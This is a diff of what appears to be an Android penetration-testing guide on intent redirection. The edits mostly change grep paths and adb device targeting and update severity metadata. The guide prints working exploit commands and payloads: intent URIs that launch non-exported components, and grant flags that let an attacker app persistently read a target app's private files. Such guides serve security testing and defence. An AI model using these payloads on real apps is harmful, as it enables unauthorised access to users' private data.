-  adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
+  adb -s "$SERIAL" shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
+  # R8 inlines the flag constants — the numeric form of a forwarder that adds grant flags itself:
+  grep -rnE '(addFlags|setFlags)\([[:space:]]*(1|2|3|64|65|67|128|129|131|195)[[:space:]]*\)' "$DEC/jadx/sources/"
   ```
 - **Proof:** Your process printing `SQLite format 3` (or the real rows) from an authority declared
   `android:exported="false"`, plus `dumpsys activity permissions` listing the grant held by
@@ -551,7 +582,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if a token is under the prefix |
 | **Attacker** | AM-03 |
 | **Applies to** | all; requires the same grant precondition as D08-010 |
-| **Requires** | provider, exported-activity, deeplink |
+| **Requires** | provider |
 | **Maps to** | `risks/intent-redirection` flag-sanitisation list; MASTG-KNOW-0117 |
 
 - **Test:** Testers set `FLAG_GRANT_READ_URI_PERMISSION` and stop. `FLAG_GRANT_PREFIX_URI_PERMISSION`
@@ -590,7 +621,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | provider, exported-activity, deeplink |
+| **Requires** | provider |
 | **Maps to** | `risks/intent-redirection` flag-sanitisation list; Microsoft EngageLab analysis — the PoC sets `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION` together; ATT&CK T1409 Stored Application Data, T1533 Data from Local System |
 
 - **Test:** Persistable turns a one-shot confused deputy into a durable exfiltration channel. The receiving
@@ -606,12 +637,12 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
       Log.i("D08", "persisted " + p.getUri() + " read=" + p.isReadPermission());
   ```
   ```bash
-  adb shell am start -n com.target.app/.Forwarder -f 0x43 --eu android.intent.extra.STREAM \
+  adb -s "$SERIAL" shell am start -n com.target.app/.Forwarder -f 0x43 --eu android.intent.extra.STREAM \
     content://com.target.app.fileprovider/files/session_backup_payload
   # 0x43 = PERSISTABLE | WRITE | READ
-  adb reboot && adb wait-for-device
-  adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
-  adb shell am start -n com.attacker.poc/.ReReadActivity     # reads again, post-reboot
+  adb -s "$SERIAL" reboot && adb -s "$SERIAL" wait-for-device
+  adb -s "$SERIAL" shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'   # UriGrantsManagerService prints grants here, not under 'providers'
+  adb -s "$SERIAL" shell am start -S -n com.attacker.poc/.ReReadActivity  # reads again, post-reboot (-S: a resident stub would swallow the fire)
   ```
 - **Proof:** `getPersistedUriPermissions()` returning the target's authority in the attacker process
   **after a reboot**, plus the file bytes read on the second boot. Also show the read still working after
@@ -629,10 +660,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all — this is the case that defeats the most commonly deployed fix |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | Ostorlab KB `INTENT_REDIRECTION` (rated High; MASVS_CODE_4, MSTG_PLATFORM_2, M4 2024); `risks/intent-redirection` (`IntentSanitizer` recommends `allowComponent` **plus** `allowData` **plus** `allowType`) |
 
 - **Test:** A team that "fixed" intent redirection usually validated the nested intent's package and class
@@ -649,25 +679,24 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Then audit the allow-listed class's entry point:
   ```bash
-  grep -rn -A40 'class AllowedActivity' out/sources/ | grep -nE 'getStringExtra|getParcelableExtra|getData\(\)|loadUrl|openInputStream|new File\('
+  grep -rn -A40 'class AllowedActivity' "$DEC/jadx/sources/" | grep -nE 'getStringExtra|getParcelableExtra|getData\(\)|loadUrl|openInputStream|new File\('
   ```
 - **Proof:** The allow-listed component acting on your extra — the WebView loading your URL, the file
   handler opening your URI — with the allow-list check visibly passing in a Frida trace of the validator.
 - **Escalation:** → D10 if the allow-listed target is a WebView (`loadUrl` from an extra is cross-app
   scripting); → D08-010 if it consumes `getData()`.
-- **Ruled out when:** The allow-listed set contains only components that read **no** extras and no data URI
-  from the forwarded intent — verify by reading each allow-listed class's `onCreate`/`onNewIntent`, not by
-  trusting the allow-list's existence.
+- **Ruled out when:** The allow-listed set contains only components that read **no** extras, no data URI and
+  no `ClipData`/`EXTRA_STREAM` (D08-068) from the forwarded intent — verify by reading each allow-listed
+  class's `onCreate`/`onNewIntent`, not by trusting the allow-list's existence.
 
 ### D08-014 · `resolveActivity()`-based validation bypass
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | Ostorlab KB `INTENT_REDIRECTION`; `risks/intent-redirection` "Common Mistakes to Avoid" |
 
 - **Test:** The hand-rolled guard that looks safe and is not:
@@ -684,7 +713,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   resolved name alone, and the extras are unchecked regardless (D08-013).
 - **How:**
   ```bash
-  grep -rnE 'resolveActivity\(|resolveService\(|queryIntentActivities\(' out/sources/ -B6 -A10 \
+  grep -rnE 'resolveActivity\(|resolveService\(|queryIntentActivities\(' "$DEC/jadx/sources/" -B6 -A10 \
     | grep -nE 'getPackageName\(\)\.equals|getClassName\(\)\.equals|startActivity'
   ```
   Payload A — satisfy the check, carry hostile extras (D08-013). Payload B — satisfy the check on the
@@ -703,10 +732,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03; AM-02 when delivered through a WebView or deep link |
 | **Applies to** | all. **Chrome blocks intent selectors**; most in-app WebViews and Firefox do not — so test inside the target's own WebView, not in Chrome |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | Oversecured "Android: Access to app protected components" §4 — the complete mitigation is `addCategory(BROWSABLE)` **plus** `setComponent(null)` **plus** `setSelector(null)`; Oversecured "Android deep link vulnerabilities" §3; AOSP `content/Intent.java` (`setSelector`) |
 
 - **Test:** An `Intent` can carry a *selector* Intent. When present, the selector — not the intent's own
@@ -715,8 +743,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   always check for both calls.
 - **How:**
   ```bash
-  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags' out/sources/
-  grep -rn 'setSelector\|getSelector' out/sources/
+  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags' "$DEC/jadx/sources/"
+  grep -rn 'setSelector\|getSelector' "$DEC/jadx/sources/"
   # the finding is setComponent(null) present WITHOUT setSelector(null)
   ```
   Build both payload forms and print them:
@@ -746,10 +774,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; at targetSdk 34+ implicit intents reach only exported components — which is precisely why the app may have exported the component to keep the pattern working |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | `about/versions/14/behavior-changes-14` — implicit intents are delivered only to exported components; use an explicit intent with `intent.package = context.packageName`; Google Play ASI "Implicit Internal Intent" campaign (2021-06-22); MASTG-TEST-0372; rule `mastg-android-implicit-intent-internal-communication` |
 
 - **Test:** Two sides of the same coin. (a) A fix that blocks `component=` on the nested intent does not
@@ -760,9 +787,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **How:**
   ```bash
   # internal actions declared on components
-  grep -nE '<action android:name="[a-z0-9._]+"' -B8 out/AndroidManifest.merged.xml | grep -B8 'exported="true"'
+  grep -nE '<action android:name="[a-z0-9._]+"' -B8 "$DEC/AndroidManifest.merged.xml" | grep -B8 'exported="true"'
   # internal implicit dispatch in code
-  grep -rnE 'new Intent\("[a-z0-9._]+"\)' out/sources/ -A6 | grep -E 'startActivity|startService|sendBroadcast'
+  grep -rnE 'new Intent\("[a-z0-9._]+"\)' "$DEC/jadx/sources/" -A6 | grep -E 'startActivity|startService|sendBroadcast'
   ```
   Payload — nested intent with an action and no component:
   ```java
@@ -772,8 +799,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Direct probe of the same action from outside:
   ```bash
-  adb shell am start -a com.target.app.INTERNAL_ACTION --es op promote
-  adb shell dumpsys package r com.target.app.INTERNAL_ACTION     # who else resolves it
+  adb -s "$SERIAL" shell am start -a com.target.app.INTERNAL_ACTION --es op promote
+  adb -s "$SERIAL" shell dumpsys package r com.target.app.INTERNAL_ACTION     # who else resolves it
   ```
 - **Proof:** The internal component handling an action sent from an unprivileged package — Frida log line
   inside the handler, or the side effect, with `dumpsys package r` showing the app is the resolver.
@@ -792,7 +819,6 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | inherits the redirect it enables |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | `risks/intent-redirection` — `androidx.core.content.IntentSanitizer` with `allowComponent`, `allowData`, `allowType`, `sanitizeByThrowing`; MASWE-0032 |
 
 - **Test:** The structural half of the finding, and the part that survives a "we will fix it later"
@@ -800,8 +826,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   externally supplied intent.
 - **How:**
   ```bash
-  grep -rn 'IntentSanitizer' out/sources/            # absence on a forwarding path is the gap
-  grep -rn 'ComponentName\|resolveActivity\|getPackageName()\.equals\|getClassName()\.equals' out/sources/ -A4
+  grep -rn 'IntentSanitizer' "$DEC/jadx/sources/"            # androidx name: renamed by R8 — a zero here is NOT absence
+  # renamed-sanitiser fingerprint: one class that calls getSelector(), getCategories(), getClipData() and getFlags() on an Intent and throws SecurityException
+  grep -rlE 'getSelector\(\)' "$DEC/jadx/sources/" | xargs grep -lE 'getClipData\(\)' | xargs grep -lE 'getCategories\(\)' | xargs grep -ln 'SecurityException'
+  grep -rn 'ComponentName\|resolveActivity\|getPackageName()\.equals\|getClassName()\.equals' "$DEC/jadx/sources/" -A4
   ```
   The documented safe shape to compare against:
   ```kotlin
@@ -825,10 +853,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, exported-service, exported-receiver, deeplink |
 | **Maps to** | `risks/intent-redirection` (`androidx.core.content.IntentSanitizer`, `sanitizeByThrowing`) |
 
 - **Test:** A mitigation that is present and believed effective is worse than none, because it stops
@@ -838,8 +865,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   `sanitizeByThrowing(intent)`.
 - **How:**
   ```bash
-  grep -rnA14 'IntentSanitizer' out/sources/ \
+  grep -rnA14 'IntentSanitizer' "$DEC/jadx/sources/" \
     | grep -nE 'allowAnyComponent|allowComponent|allowPackage|allowData|allowType|allowFlags|allowHistoryStackFlags|allowExtra|sanitizeByThrowing|sanitize\('
+  # on an R8 build the class and the allow* methods are renamed: start from the D08-017 fingerprint class and read its builder calls by shape (a predicate/list per field)
   ```
   For each site record: which fields are allow-listed, whether `allowFlags` permits `FLAG_GRANT_*`, and
   whether the return value of `sanitize()` is actually the object that gets launched (a very common bug is
@@ -858,7 +886,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | Android 16 / API 36 for the direct API; the reflective form is used by apps compiling against API 35 and below, so grep at any compile target |
 | **Maps to** | `risks/intent-redirection` — "Android 16 introduces by-default security hardening for intent redirection exploits", `removeLaunchSecurityProtection()`, "Only opt out when absolutely necessary"; `about/versions/16/behavior-changes-all` — "Android 16 introduces a new API that allows apps to opt out of launch security protections… You can directly use the `removeLaunchSecurityProtection()` method on the Intent object", with the warning that "opting out of security protections increases vulnerability risk" |
@@ -870,9 +898,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   developer knew was doing nested-intent launching.
 - **How:**
   ```bash
-  grep -rn 'removeLaunchSecurityProtection' out/sources/ out/smali*/
+  grep -rn 'removeLaunchSecurityProtection' "$DEC/jadx/sources/" "$DEC/apktool/smali"*/
   # the reflective form for apps compiled against API <= 35 — no corpus grep includes this
-  grep -rn 'getDeclaredMethod("removeLaunchSecurityProtection")\|"removeLaunchSecurityProtection"' out/sources/ out/smali*/
+  grep -rn 'getDeclaredMethod("removeLaunchSecurityProtection")\|"removeLaunchSecurityProtection"' "$DEC/jadx/sources/" "$DEC/apktool/smali"*/
   ```
   Then run D08-004 and show the same payload succeeding here where it is blocked on a stock API-36 build.
 - **Proof:** The decompiled call site, plus the redirection PoC working on an Android 16 device. Lead the
@@ -889,42 +917,49 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | targetSdk 36+ |
 | **Requires** | targetsdk>=36 |
 | **Maps to** | `about/versions/16/behavior-changes-16` — "Safer Intents", `android:intentMatchingFlags` with values `enforceIntentFilter`, `none`, `allowNullAction` |
 
 - **Test:** Android 16 requires explicit intents to match the target component's intent filter and blocks
-  action-less intents from matching filters. The per-component opt-out is `android:intentMatchingFlags`.
+  action-less intents from matching filters — for apps targeting SDK 36+, and component-type dependent;
+  shell and system senders are not the enforcement subject, so a shell-sent intent decides nothing. Decide it
+  empirically: send the action-less and the filter-mismatched intent from the zero-permission probe (not
+  `adb shell`) to a component **with** an intent filter and record delivered/blocked; then read
+  `intentMatchingFlags` only to explain a delivery that the enforcement should have blocked. The
+  per-component opt-out is `android:intentMatchingFlags`.
   A component carrying `none` is asking to receive intents the platform would otherwise reject; one
   carrying `allowNullAction` re-opens the action-less match specifically.
 - **How:**
   ```bash
-  grep -nE 'intentMatchingFlags' out/AndroidManifest.merged.xml
+  grep -nE 'intentMatchingFlags' "$DEC/AndroidManifest.merged.xml"
   # record the value per component: enforceIntentFilter (hardened) | none (opt-out) | allowNullAction
   ```
   Then deliver an intent that should be filtered:
   ```bash
-  adb shell am start -n com.target.app/.ExportedActivity --es payload X    # no -a action
-  adb shell dumpsys activity activities | grep -m1 mResumedActivity
+  adb -s "$SERIAL" shell am start -n com.target.app/.ExportedActivity --es payload X    # no -a action
+  adb -s "$SERIAL" shell dumpsys activity activities | grep -m1 mResumedActivity
   ```
-- **Proof:** The attribute on the component, plus delivery of an action-less or filter-mismatched intent
-  that reaches `onCreate` — shown by a Frida hook printing `getIntent().getAction()` as `null`.
+- **Proof:** The attribute on the component, plus the probe's own log line for both intents (delivered or
+  blocked) and the `PackageManager`/`ActivityTaskManager` refusal text; a Frida hook printing
+  `getIntent().getAction()` as `null` for the delivered one. A shell-sent intent decides nothing.
 - **Escalation:** Severity comes from what the component then does; on its own it is a hardening opt-out.
   Combine with D08-019: an app that sets both has disabled the Android 16 intent hardening on both axes.
 - **Ruled out when:** No component declares `intentMatchingFlags`, or every declaration is
-  `enforceIntentFilter`. On targetSdk < 36 the attribute is inert — say so rather than reporting it.
+  `enforceIntentFilter`, **and** the probe-sent mismatched intent was blocked (the positive control that the
+  enforcement is live on the device and targetSdk under test). On targetSdk < 36 the attribute is inert —
+  say so rather than reporting it.
 
 ### D08-021 · Task and launch flags preserved through the forward
 
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, deeplink |
 | **Maps to** | `risks/intent-redirection` (the sanitisation step includes checking and clearing flags); AOSP `content/Intent.java` flag constants; `FLAG_DEBUG_LOG_RESOLUTION = 0x00000008` |
 
 - **Test:** Grant flags are not the only ones that matter. A forward that preserves
@@ -934,17 +969,17 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   component that believes it is talking to the original caller.
 - **How:**
   ```bash
-  grep -rn 'getFlags()\|setFlags(\|addFlags(\|removeFlags(' out/sources/ | head -40
+  grep -rn 'getFlags()\|setFlags(\|addFlags(\|removeFlags(' "$DEC/jadx/sources/" | head -40
   ```
   Probe each flag independently, one `am start` per flag, and record which survive:
   ```bash
   for F in 0x10000000 0x04000000 0x08000000 0x40000000 0x02000000; do
-    adb shell am start -n com.target.app/.Forwarder -f $F --es payload X
-    adb shell dumpsys activity activities | sed -n '/Task/,/mResumedActivity/p' | head -20
+    adb -s "$SERIAL" shell am start -n com.target.app/.Forwarder -f $F --es payload X
+    adb -s "$SERIAL" shell dumpsys activity activities | sed -n '/Task/,/mResumedActivity/p' | head -20
   done
   # resolver trace to see what the platform actually picked:
-  adb shell am start -a android.intent.action.VIEW -f 0x00000008 -d 'myapp://route'
-  adb logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -f 0x00000008 -d 'myapp://route'
+  adb -s "$SERIAL" logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
   ```
 - **Proof:** `dumpsys activity activities` showing the victim's task with your activity on top and the
   previous entries cleared, or a result delivered to a component that never called you.
@@ -959,7 +994,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — argue toward `broken_authentication_and_session_management.authentication_bypass` (P1) on the reached component |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — argue toward `broken_authentication_and_session_management.authentication_bypass` (P1) on the reached component |
 | **Attacker** | AM-02 (a link is enough; no attacker app installed) |
 | **Applies to** | all |
 | **Maps to** | AOSP `content/Intent.java` (`parseUri`, `URI_INTENT_SCHEME`, `URI_ALLOW_UNSAFE`, `URI_ANDROID_APP_SCHEME`); MASWE-0029 (CWE-939, CWE-917); MASWE-0032 (CWE-927); Oversecured deep-link taxonomy "Intent redirection via WebView — `Intent.parseUri()` launching non-exported internal Activities"; CVE-2020-14116 (Xiaomi Mi Browser), CVE-2024-26131 (Element Android — WebView manipulation, PIN bypass, login hijack) |
@@ -970,10 +1005,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   usually a full severity band.
 - **How:**
   ```bash
-  grep -rnE 'Intent\.parseUri\(|parseUri\(' out/sources/ -B6 -A10
-  grep -rn 'URI_INTENT_SCHEME\|URI_ANDROID_APP_SCHEME\|URI_ALLOW_UNSAFE' out/sources/
+  grep -rnE 'Intent\.parseUri\(|parseUri\(' "$DEC/jadx/sources/" -B6 -A10
+  grep -rn 'URI_INTENT_SCHEME\|URI_ANDROID_APP_SCHEME\|URI_ALLOW_UNSAFE' "$DEC/jadx/sources/"
   # and the post-parse sanitisation — its absence is the gap
-  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags\|addCategory(Intent.CATEGORY_BROWSABLE)' out/sources/
+  grep -rn 'setComponent(null)\|setPackage(null)\|setSelector(null)\|removeFlags\|addCategory(Intent.CATEGORY_BROWSABLE)' "$DEC/jadx/sources/"
   ```
   Payloads, escalating:
   ```
@@ -984,7 +1019,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Delivery through the app's own router:
   ```bash
-  adb shell am start -a android.intent.action.VIEW \
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW \
     -d 'myapp://open?next=intent%3A%23Intent%3Bcomponent%3Dcom.target.app%2F.internal.AdminActivity%3Bend'
   ```
 - **Proof:** The internal component launches from a plain hyperlink with no attacker app installed —
@@ -1013,18 +1048,16 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ordinary grep for a symbolic name will catch in obfuscated SDK code.
 - **How:**
   ```bash
-  grep -rn "parseUri(" out/sources/ | grep -viE '^out/sources/(android|androidx)/'
-  grep -rn "URI_ALLOW_UNSAFE" out/sources/
+  grep -rn "parseUri(" "$DEC/jadx/sources/" | grep -vE "^$DEC/jadx/sources/(android|androidx)/"
+  grep -rn "URI_ALLOW_UNSAFE" "$DEC/jadx/sources/"
   # the numeric literal form, which is what survives obfuscation
-  grep -rnE 'parseUri\([^,]+,\s*4\s*\)' out/sources/
-  grep -rn 'n_intent_uri\|processPlatformMessage\|MTCommonActivity' out/sources/
+  grep -rnE 'parseUri\([^,]+,\s*4\s*\)' "$DEC/jadx/sources/"
+  grep -rn 'n_intent_uri\|processPlatformMessage\|MTCommonActivity' "$DEC/jadx/sources/"
   ```
   PoC against a JSON-wrapped SDK payload:
   ```bash
-  adb shell am start -n com.target.app/com.engagelab.privates.push.platform.MTCommonActivity \
-    --es <sdk_message_key> '{"n_intent_uri":"intent:#Intent;component=com.attacker.poc/.Sink;S.uri=content://com.target.app.provider/;launchFlags=0x43;end"}'
-  adb shell am start -n com.target.app/.SdkProxyActivity \
-    --es payload '{"n_intent_uri":"intent:#Intent;action=android.intent.action.VIEW;data=content://com.target.app.fileprovider/root/secret.xml;launchFlags=0x43;end"}'
+  adb -s "$SERIAL" shell "am start -n com.target.app/<SdkMessageActivity> --es <sdk_message_key> '{\"n_intent_uri\":\"intent:#Intent;component=com.attacker.poc/.Sink;S.uri=content://com.target.app.provider/;launchFlags=0x43;end\"}'"
+  adb -s "$SERIAL" shell "am start -n com.target.app/.SdkProxyActivity --es payload '{\"n_intent_uri\":\"intent:#Intent;action=android.intent.action.VIEW;data=content://com.target.app.fileprovider/root/secret.xml;launchFlags=0x43;end\"}'"
   ```
 - **Proof:** In the attacker app, `getContentResolver().getPersistedUriPermissions()` returns a grant
   against the target's authority, and a subsequent `openInputStream()` returns the target's private bytes.
@@ -1039,7 +1072,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the JS-in-privileged-origin outcome is `broken_authentication_and_session_management.authentication_bypass` (P1) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); the JS-in-privileged-origin outcome is `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-02, AM-09 (malicious backend/CDN serving a page the WebView loads) |
 | **Applies to** | all |
 | **Requires** | webview |
@@ -1050,7 +1083,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   XSS on a legitimately allow-listed host — into an arbitrary-component launcher running as the app.
 - **How:**
   ```bash
-  grep -rn 'shouldOverrideUrlLoading' out/sources/ -A25 | grep -nE 'parseUri|startActivity|URI_INTENT_SCHEME|setComponent\(null\)|setSelector\(null\)'
+  grep -rn 'shouldOverrideUrlLoading' "$DEC/jadx/sources/" -A25 | grep -nE 'parseUri|startActivity|URI_INTENT_SCHEME|setComponent\(null\)|setSelector\(null\)'
   ```
   Host a page and load it in the target's WebView:
   ```html
@@ -1076,7 +1109,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-02 |
 | **Applies to** | LEGACY — pre-`parseUri` API surface still present in old code paths and in vendored SDKs |
 | **Maps to** | AOSP `content/Intent.java`; MASWE-0032 |
@@ -1086,7 +1119,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   is usually old enough to predate every mitigation in this chapter.
 - **How:**
   ```bash
-  grep -rnE 'Intent\.getIntent\(|Intent\.getIntentOld\(' out/sources/ out/smali*/
+  grep -rnE 'Intent\.getIntent\(|Intent\.getIntentOld\(' "$DEC/jadx/sources/" "$DEC/apktool/smali"*/
   ```
   Same payload catalogue as D08-022.
 - **Proof:** The named internal component starting from a string the attacker supplied, with the call site
@@ -1099,7 +1132,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with the grant chain, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); with the grant chain, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-09 (malicious or compromised backend), AM-08 (malicious SDK), AM-03 when the receiver is exported |
 | **Applies to** | all apps with push, in-app messaging or remote-config-driven routing |
 | **Requires** | push |
@@ -1110,9 +1143,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   intent-redirection sink with an AM-09 attacker, and on an exported push receiver an AM-03 one too.
 - **How:**
   ```bash
-  grep -rnE 'onMessageReceived|RemoteMessage|getData\(\)\.get\(|getNotification\(\)\.getClickAction' out/sources/ -A12 \
+  grep -rnE 'onMessageReceived|RemoteMessage|getData\(\)\.get\(|getNotification\(\)\.getClickAction' "$DEC/jadx/sources/" -A12 \
     | grep -nE 'parseUri|startActivity|Uri\.parse|setComponent|setClassName'
-  grep -nE 'com.google.firebase.MESSAGING_EVENT|<receiver' -A8 out/AndroidManifest.merged.xml | grep -n 'exported="true"'
+  grep -nE 'com.google.firebase.MESSAGING_EVENT|<receiver' -A8 "$DEC/AndroidManifest.merged.xml" | grep -n 'exported="true"'
   ```
   Deliver the payload three ways and note which work: your own FCM send to a test token; a forged local
   broadcast if the receiver is exported; and `am start` on the handling activity with the same extras.
@@ -1130,7 +1163,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); RCE outcome `server_side_injection.remote_code_execution_rce` (P1) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); RCE outcome `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
 | **Requires** | deeplink |
@@ -1141,7 +1174,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   a web page, and it simultaneously hands the attacker a raw `Parcelable` deserialisation surface.
 - **How:**
   ```bash
-  grep -rn 'Parcel.obtain()\|unmarshall(\|readParcelable(' out/sources/ -B8 -A8 \
+  grep -rn 'Parcel.obtain()\|unmarshall(\|readParcelable(' "$DEC/jadx/sources/" -B8 -A8 \
     | grep -inE 'getData\(\)|getQueryParameter|Base64.decode'
   ```
   The vulnerable shape:
@@ -1161,7 +1194,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   Log.i("D08", Base64.encodeToString(p.marshall(), Base64.NO_WRAP));
   ```
   ```bash
-  adb shell am start -a android.intent.action.VIEW -d 'myapp://handle/?param=<BASE64>'
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -d 'myapp://handle/?param=<BASE64>'
   ```
 - **Proof:** A browser-triggerable deep link whose base64 parameter unmarshals to an `Intent` targeting a
   non-exported component, and that component launching — `dumpsys activity activities` plus a screenshot.
@@ -1176,7 +1209,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | typed overloads exist from **API 33** (Android 13); LEGACY below that — say so explicitly rather than reporting a pre-33 app for not using an API that did not exist |
 | **Maps to** | `risks/unsafe-deserialization` — use `Intent.getParcelableExtra(String, Class<T>)`, `Intent.getParcelableArrayListExtra(String, Class<? extends T>)`, `Parcel.readParcelable(ClassLoader, Class<T>)` on API 33+; "catches type mismatches before deserialization, preventing privilege escalation (e.g. CVE-2021-0928)"; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**, the patch "adds the type parameter to the original call"; MASWE-0050 (CWE-502, CWE-501) |
@@ -1187,10 +1220,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   against `AccountManagerService.checkKeyIntent()` via `bundle.getParcelable(KEY_INTENT)`.
 - **How:**
   ```bash
